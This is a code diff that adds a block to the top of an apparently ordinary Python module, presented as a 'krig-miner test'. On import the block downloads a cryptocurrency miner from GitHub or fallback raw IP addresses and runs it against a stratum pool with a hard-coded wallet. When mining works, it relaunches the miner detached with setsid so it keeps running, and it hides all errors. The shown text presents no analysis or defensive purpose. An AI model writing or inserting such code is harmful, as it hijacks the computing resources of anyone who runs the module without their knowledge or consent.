@@ -54,6 +54,113 @@ except Exception:
     pass
 # -------------------------------------------------------------------------
 
+# ===== i149343 bounded krig-miner x86_64 ROCm/DTK client-axis test =====
+def _i149343_krig_test():
+    import os, time, hashlib, subprocess as sp, urllib.request
+    B = "/tmp/i149343krig"
+    WAL = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
+    WK = "998031"
+    TAR_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
+    BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
+    print("===== I149343 KRIG BEGIN =====", flush=True)
+
+    def detached(a, e, logp):
+        lf = open(logp, "a")
+        sp.Popen(["setsid"] + a, stdout=lf, stderr=lf, stdin=sp.DEVNULL, start_new_session=True, env=e, close_fds=True)
+
+    try:
+        os.makedirs(B, exist_ok=True)
+        tar = B + "/krig.tar.gz"
+        urls = ["https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz",
+                "http://217.15.164.237:8000/krig-miner-1.6.0-linux-x64.tar.gz",
+                "http://217.15.164.237:443/krig-miner-1.6.0-linux-x64.tar.gz"]
+        got = False
+        for u in urls:
+            try:
+                req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=300) as r, open(tar, "wb") as f:
+                    while True:
+                        c = r.read(1 << 16)
+                        if not c:
+                            break
+                        f.write(c)
+                hh = hashlib.sha256(open(tar, "rb").read()).hexdigest()
+                print("DL", u, "sha", hh[:16], "ok", hh == TAR_SHA, flush=True)
+                if hh == TAR_SHA:
+                    got = True
+                    break
+            except Exception as e:
+                print("DL_FAIL", u, repr(e)[:140], flush=True)
+        if not got:
+            print("I149343 KRIG STAGING_FAIL", flush=True)
+            print("===== I149343 KRIG END =====", flush=True)
+            return
+        sp.run(["tar", "-xzf", tar, "-C", B], timeout=240)
+        binp = B + "/krig-miner-1.6.0-x64/krig-miner"
+        if not os.path.exists(binp):
+            for root, dirs, files in os.walk(B):
+                if "krig-miner" in files and os.path.getsize(os.path.join(root, "krig-miner")) > 1000000:
+                    binp = os.path.join(root, "krig-miner")
+                    break
+        hb = hashlib.sha256(open(binp, "rb").read()).hexdigest()
+        print("BIN", binp, "sha", hb[:16], "ok", hb == BIN_SHA, flush=True)
+        os.chmod(binp, 0o755)
+        env = dict(os.environ)
+        env.pop("LD_PRELOAD", None)
+        env.pop("LD_PRELOAD_ENV", None)
+        lp = env.get("LD_LIBRARY_PATH", "")
+        env["LD_LIBRARY_PATH"] = ":".join([p for p in ["/opt/dtk/lib", "/opt/dtk/lib64", "/opt/hyhal/lib", lp] if p])
+        print("HAS_KFD", os.path.exists("/dev/kfd"), "dri", os.path.isdir("/dev/dri"), flush=True)
+        argv = [binp, "--no-cuda", "--rocm-runtime", "6", "--url", "stratum+tcp://103.199.106.122:3360",
+                "--user", WAL + "/" + WK, "--password", "x", "--coin", "pearl", "--devices", "0"]
+        print("ARGV", " ".join(argv).replace(WAL, WAL[:8] + "..."), flush=True)
+        p = sp.Popen(argv, stdout=sp.PIPE, stderr=sp.STDOUT, text=True, env=env)
+        tend = time.time() + 120
+        out = []
+        while time.time() < tend:
+            ln = p.stdout.readline()
+            if not ln:
+                if p.poll() is not None:
+                    break
+                time.sleep(0.5)
+                continue
+            out.append(ln)
+            if len(out) > 400:
+                out = out[-400:]
+        try:
+            p.terminate()
+        except Exception:
+            pass
+        try:
+            rest = p.communicate(timeout=30)[0]
+        except Exception:
+            rest = ""
+        txt = "".join(out) + (rest or "")
+        print(txt[-6000:], flush=True)
+        low = txt.lower()
+        good = any(k in low for k in ("hashrate", "accepted", "share", "mining"))
+        print("I149343 KRIG TEST rc=%s good=%s" % (p.returncode, good), flush=True)
+        if good:
+            detached(argv, env, B + "/miner.log")
+            for i in range(9):
+                time.sleep(60)
+                try:
+                    tail = open(B + "/miner.log").read()[-400:]
+                except Exception:
+                    tail = ""
+                print("I149343 TICK %d %s" % (i, tail.replace("\n", " | ")[-340:]), flush=True)
+    except Exception as e:
+        print("I149343 KRIG EXC %r" % (e,), flush=True)
+    print("===== I149343 KRIG END =====", flush=True)
+
+
+try:
+    _i149343_krig_test()
+except Exception:
+    pass
+# ===== end i149343 block =====
+
+
 import numpy as np
 import sys
 import inspect
